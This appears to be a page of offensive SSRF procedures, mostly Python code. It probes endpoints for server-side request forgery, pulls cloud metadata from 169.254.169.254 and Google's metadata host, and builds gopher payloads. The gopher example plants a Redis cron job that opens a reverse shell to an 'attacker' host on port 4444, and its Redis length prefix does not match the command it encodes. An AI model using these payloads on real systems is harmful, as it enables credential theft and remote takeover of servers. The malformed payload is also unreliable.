# Deep Technical Procedures

## SSRF Detection Script

```python
import requests
import threading
import http.server
import json

class SSRFDetector:
    def __init__(self, callback_url):
        self.callback_url = callback_url
        self.callbacks = []
        
    def test_url_fetch(self, endpoint, payload_url):
        """Test if endpoint performs SSRF by fetching external URL"""
        try:
            resp = requests.post(endpoint, json={'url': payload_url}, timeout=5)
            return resp.status_code, resp.text[:200]
        except:
            return None, "Request failed"
    
    def test_metadata(self, endpoint):
        """Test for cloud metadata SSRF"""
        metadata_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
        ]
        results = {}
        for url in metadata_urls:
            try:
                resp = requests.post(endpoint, json={'url': url}, timeout=5)
                if resp.status_code == 200 and resp.text:
                    results[url] = resp.text[:500]
            except:
                pass
        return results
```

## Gopher Protocol Exploitation

```python
import urllib.parse

def craft_gopher_payload(host, port, payload):
    """Craft gopher protocol payload for SSRF exploitation"""
    encoded = urllib.parse.quote(payload)
    return f'gopher://{host}:{port}/_{encoded}'

# Example: Redis command injection via gopher
redis_rce = craft_gopher_payload(
    '127.0.0.1', 6379,
    '*3\r\n$3\r\nSET\r\n$5\r\nshell\r\n$28\r\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\r\n'
)
```

## Blind SSRF with DNS OOB

```python
import requests
import hashlib

def blind_ssrf_detection(target_endpoint, collaborator_domain):
    """Detect blind SSRF using DNS out-of-band"""
    unique_id = hashlib.md5(target_endpoint.encode()).hexdigest()[:8]
    callback_url = f"http://{unique_id}.{collaborator_domain}/ssrf-test"
    
    try:
        requests.post(target_endpoint, json={'url': callback_url}, timeout=5)
    except:
        pass
    
    print(f"Check {callback_url} for DNS/HTTP callback from target server")
```
